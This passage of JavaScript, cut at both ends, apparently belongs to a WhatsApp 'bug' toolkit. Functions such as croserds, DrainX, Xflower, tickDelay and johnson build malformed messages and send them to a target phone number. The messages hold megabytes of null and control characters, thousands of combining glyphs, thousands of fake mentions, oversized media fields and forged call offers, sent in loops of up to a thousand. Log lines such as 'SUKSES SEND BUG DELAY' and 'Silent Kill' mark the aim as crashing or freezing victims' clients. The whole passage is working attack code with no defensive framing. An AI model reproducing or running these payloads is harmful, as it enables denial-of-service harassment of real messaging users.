                                    },
                                    nativeFlowResponseMessage: {
                                        name: "galaxy_message",
                                        paramsJson: "\r".repeat(50000),
                                        version: 3,
                                    },
                                }),
                            },
                        },
                    },
                },
            },
        },
    };
    
    const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "⟅༑", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
    });

    const button2 = await generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            body: {
                text: "Jule Berdasi" + "𑆿𑆴𑆿".repeat(6000)
            },
            nativeFlowResponseMessage: {
                name: "button_reply",
                paramsJson: JSON.stringify({ id: "option_a" })
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
    });

    const msg3 = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: true,
            id: Math.random().toString(36).substring(7)
        }
    };

    const msg2 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    reviewResponseMessage: {
                        message: {
                            text: "\u0000".repeat(300000),
                            contextInfo: {
                                participant: target,
                                remoteJid: "status@broadcast",
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        stickerMessage: {
                                            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA?ccb=9-4&oh=01_Q5Aa2wExHZhJFzy9jE5OTov33YwJCo2w8UqmhRgqHNrqT4KPUQ&oe=692440E0&_nc_sid=e6ed6c&mms3=true",
                                            fileSha256: "1nmk47DVAUSmXUUJxfOD5X/LwUi0BgJwgmCvOuK3pXI=",
                                            fileEncSha256: "LaaBTYFkIZxif2lm2TfSIt9yATBfYd9w86UxehMa4rI=",
                                            mediaKey: "7XhMJyn+ss8sVb2qs36Kh9+lrGVwu29d1IO0ZjHa09A=",
                                            mimetype: "image/webp",
                                            height: 999999,
                                            width: 999999,
                                            directPath: "/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA?ccb=9-4&oh=01_Q5Aa2wExHZhJFzy9jE5OTov33YwJCo2w8UqmhRgqHNrqT4KPUQ&oe=692440E0&_nc_sid=e6ed6c",
                                            fileLength: "999999999",
                                            mediaKeyTimestamp: "1761396583",
                                            isAnimated: false,
                                            stickerSentTs: Date.now(),
                                            isAvatar: false,
                                            isAiSticker: false,
                                            isLottie: false,
                                            contextInfo: {
                                                participant: target,
                                                mentionedJid: [
                                                    target,
                                                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net")
                                                ],
                                                remoteJid: "X",
                                                stanzaId: "1234567890ABCDEF",
                                                groupMentions: Array.from({ length: 1900 }, () => ({
                                                    groupJid: "628" + Math.floor(Math.random() * 1000000000) + "@g.us",
                                                    groupSubject: "ꦾ".repeat(50000)
                                                }))
                                            }
                                        },
                                        body: {
                                            text: "Ӿ₩Ɽ",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "call_permission_request",
                                            paramsJson: JSON.stringify({
                                                flow_cta: "\u0003".repeat(500000)
                                            }),
                                            version: 3
                                        }
                                    }
                                },
                                mentionedJid: Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`)
                            }
                        }
                    }
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
    });
    
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
        messageId: msg2.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    await sock.relayMessage(target, {
        statusMentionMessage: {
            message: {
                protocolreviewMessage: {
                    key: msg3.key,
                    type: 25
                }
            }
        }
    }, {
        additionalNodes: [
            {
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }
        ]
    });
    
    console.log(`Succes Send Delay ${target}`);
}

async function croserds(sock, target) {
  if (!global.__flyingLimit) global.__flyingLimit = {};
  if (!global.__flyingMutex) global.__flyingMutex = Promise.resolve();

  const delay = ms => new Promise(r => setTimeout(r, ms));

  global.__flyingMutex = global.__flyingMutex.then(async () => {
    let last = global.__flyingLimit[target] || 0;
    let now = Date.now();
    let wait = last + (1000 + Math.random() * 500) - now;
    if (wait > 0) await delay(wait);
    global.__flyingLimit[target] = Date.now();
  });

  await global.__flyingMutex;

  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

  await sock.assertSessions(devices);

  let xnxx = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch {}
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let memek = xnxx();
  let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let yntkts = sock.encodeWAMessage?.bind(sock);

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs) => {
    if (!recipientJids.length)
      return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
    let arrayMsg = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(
      arrayMsg.map(async ({ recipientJid: jid, message: msg }) => {
        let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));
        return memek.mutex(jid, async () => {
          let { type, ciphertext } =
            await sock.signalRepository.encryptMessage({
              jid,
              data: bytes
            });

          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

          return {
            tag: 'to',
            attrs: { jid },
            content: [{
              tag: 'enc',
              attrs: { v: '2', type, ...extraAttrs },
              content: ciphertext
            }]
          };
        });
      })
    );

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  let { nodes: destinations, shouldIncludeDeviceIdentity } =
    await sock.createParticipantNodes(
      devices,
      { conversation: "y" },
      { count: '0' }
    );

  let callId = crypto.randomBytes(16)
    .toString("hex")
    .slice(0, 64)
    .toUpperCase();

  let callNode = {
    tag: "call",
    attrs: {
      to: target,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": callId,
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        { tag: "net", attrs: { medium: "3" } },
        {
          tag: "capability",
          attrs: { ver: "1" },
          content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
        },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity
          ? [{
              tag: "device-identity",
              attrs: {},
              content: encodeSignedDeviceIdentity(
                sock.authState.creds.account,
                true
              )
            }]
          : [])
      ]
    }]
  };

  await sock.sendNode(callNode);

  setTimeout(async () => {
    try {
      await sock.sendNode({
        tag: "call",
        attrs: {
          to: target,
          id: sock.generateMessageTag(),
          from: sock.user.id
        },
        content: [{
          tag: "terminate",
          attrs: {
            "call-id": callId,
            reason: "success"
          }
        }]
      });
    } catch {}
  }, 3000);
  try {
    await sock.relayMessage(
      "status@broadcast",
      {
        groupStatusMessageV2: {
          message: {
            extendedTextMessage: {
              text: "Xata" + "𑇂𑆵𑆴𑆿".repeat(40000)
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: { status_setting: "allowlist" },
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: target }
            }]
          }]
        }]
      }
    );
  } catch {}
}

async function DrainX(target) {
  let cards = [];
  
  let Mentions = [
    "131338822@s.whatsapp.net",
    ...Array.from(
      { length: 1900 },
      () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    ),
  ];

  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "ោ៝".repeat(1000),
    title: "XxX",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };
 
  const msg1 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
          fileLength: "289511",
          seconds: 15,
          mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
          caption: "\u0000".repeat(104500),
          height: 640,
          width: 640,
          fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
          directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743848703",
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: Mentions,
          },
          streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
          thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
          thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
          thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
          annotations: [
            {
              embeddedContent: {
                X,
              },
              embeddedAction: true,
              },
            ],
          },
        },
      },
    },
    {}
  );
  
  for (let r = 0; r < 1000; r++) {
  cards.push({
    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
    header: proto.Message.InteractiveMessage.Header.fromObject({
      title: " ",
      hasMediaAttachment: true,
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
        fileLength: "18352",
        height: 720,
        width: 1280,
        mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
        fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
        directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1737281900",
        jpegThumbnail:
          "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
        scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
        scanLengths: [3537, 10557, 1905, 2353],
        midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
      },
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
      buttons: [],
      }),
    });
  }

  let msg2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3,
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: "\u0003" }),
            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...cards],
            }),
          }),
        },
      },
    },
    {}
  );
  
  await sock.relayMessage("status@broadcast", msg1.message, {
    messageId: msg1.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function Xflowerzxx(sock, target) {
    for (let i = 0; i < 1000; i++) {
        const push = [];
        const buttons = [];
        
        for (let j = 0; j < 5; j++) {
            buttons.push({
                name: 'galaxy_message',
                buttonParamsJson: JSON.stringify({
                    header: 'null',
                    body: 'xxx',
                    flow_action: 'navigate',
                    flow_action_payload: {
                        screen: 'FORM_SCREEN'
                    },
                    flow_cta: 'Grattler',
                    flow_id: '1169834181134583',
                    flow_message_version: '3',
                    flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',
                }),
            });
        }
        
        for (let k = 0; k < 1000; k++) {
            push.push({
                body: {
                    text: '𖣂᳟᪳'
                },
                footer: {
                    text: ''
                },
                header: {
                    title: 'X ',
                    hasMediaAttachment: true,
                    imageMessage: {
                        url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'image/jpeg',
                        fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
                        fileLength: '591',
                        height: 0,
                        width: 0,
                        mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
                        fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
                        directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',
                        mediaKeyTimestamp: '1721344123',
                        jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z',
                        scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',
                        scanLengths: [247, 201, 73, 63],
                        midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro=',
                    },
                },
                nativeFlowMessage: {
                    buttons: [],
                },
            });
        }
        
        const carousel = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: false,
                },
                body: {
                    text: '\u0000\u0000\u0000\u0000',
                },
                footer: {
                    text: '‌⤻᪳',
                },
                carouselMessage: {
                    cards: [...push],
                },
            }
        }, {
            userJid: target
        });
        
        await sock.relayMessage(target, { groupStatusMessageV2: { message: carousel.message } }, {
            messageId: carousel.key.id,
            participant: {
                jid: target
            },
        });
    }
    
    await sock.relayMessage("status@broadcast", {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {
                status_setting: "allowlist"
            },
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    }
                }]
            }]
        }]
    });
};

async function Xflower(sock, target) {
  if (!sock?.relayMessage) return;
  if (!target.endsWith("@s.whatsapp.net")) {
    target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  }
  try {
    await sock.relayMessage(
      "status@broadcast",
      {
        groupStatusMessageV2: {
          message: {
            extendedTextMessage: {
              text: "Ovalium" + "𑇂𑆵𑆴𑆿".repeat(40000),
              matchedText: null,
              jpegThumbnail: null,
              previewType: 6,
              paymentLinkMetadata: {
                button: { displayText: "X" },
                header: { headerType: 1 },
                provider: { paramsJson: "{{{".repeat(20000) }
              },
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "1@newsletter",
                  newsletterName: "X",
                  serverMessageId: 7205
                }
              }
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "allowlist" }
          }
        ]
      }
    );
  } catch (e) {
    console.log("bug error:", e?.message || e);
  }
}

async function tickDelay(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "XW4R", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            entryPointConversionSource: "call_permission_request"
          }
        },
        extendedTextMessage: {
          text: "Kill Invisible" + "ꦾ".repeat(50000),
          matchedText: "ꦽ".repeat(20000),
          description: "Who",
          title: "ꦽ".repeat(20000),
          previewType: "NONE",
          jpegThumbnail:
            "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwM0QmF//aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABERAgD/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1995 },
                () =>
                  `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "warx@newsletter",
                newsletterName:
                  "Invisible Kill Delay" + "ꦾ".repeat(10000),
                caption:
                  "Silent Kill" +
                  "ꦾ".repeat(60000) +
                  "ោ៝".repeat(60000),
                inviteExpiration: "999999999"
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName:
                "Killer You" + "⃝꙰꙰꙰".repeat(10000),
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      }
    }
  }, {
    userJid: target,
    messageId: undefined,
    messageTimestamp: (Date.now() / 1000) | 0
  });

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || undefined,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target });

  console.log(`SUKSES SEND BUG DELAY Ke ${target}`);
}

async function johnson(sock, target, mention = true) {
try {
const msg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
        mimetype: "image/webp",
        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
        fileLength: 999,
        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
         mediaKeyTimestamp: Math.floor(Date.now() / 999),
         isAnimated: true,
         isAvatar: null,
         isAiSticker: true,
         isLottie: false,
         height: 512,
         width: 512,
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: target,
            externalAdReply: {},
            quotedMessage: {
              ImageMessage: {
               url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: Buffer.from("CrP44RkJbl+shQQxxlJ6s0SAAcOWqWgxw3iEiGi3zZI=", "base64"),
            fileLength: "59668",
            height: 736,
            width: 736,
            mediaKey: Buffer.from("YRUaXE2466bqWOmhGwPxA6bC3Qif2tTFmsJ/Q+49ijc=", "base64"),
            fileEncSha256: Buffer.from("rTAiyS+goq3w37k70/mwSiCVRUFjD66uanaabunAG8w=", "base64"),
            directPath: "/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c",
            mediaKeyTimestamp: "1753601096",
            jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD...", "base64")
              }
            }
          }
        }
      }
    }
 };

  const jancuk = await generateWAMessageFromContent(target, msg, {});
  
  
   
   await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: jancuk.message
                }
            },
            mention
                ? { messageId: jancuk.key.id, participant: { jid: target } }
                : { messageId: jancuk.key.id }
        );
  
  const lib = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const Content = generateWAMessageFromContent(
    target,
    lib.message,
    { userJid: target }
  );
  
  await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: Content.message
                }
            },
            mention
                ? { messageId: Content.key.id, participant: { jid: target } }
                : { messageId: Content.key.id }
        );
     
     const msg2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Xwar memasak",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\u0000".repeat(450000)}"}}`,
              version: 3,
            },
            entryPointConversionSource: "call_permission_request"
          }
        }
      }
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999")
    })
       
        for (let i = 0; i < 45; i++) { 
    await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg2.message
                }
            },
            mention
                ? { messageId: msg2.key.id, participant: { jid: target } }
                : { messageId: msg2.key.id }
        );
      }
} catch (err) {
  console.log(err.message)
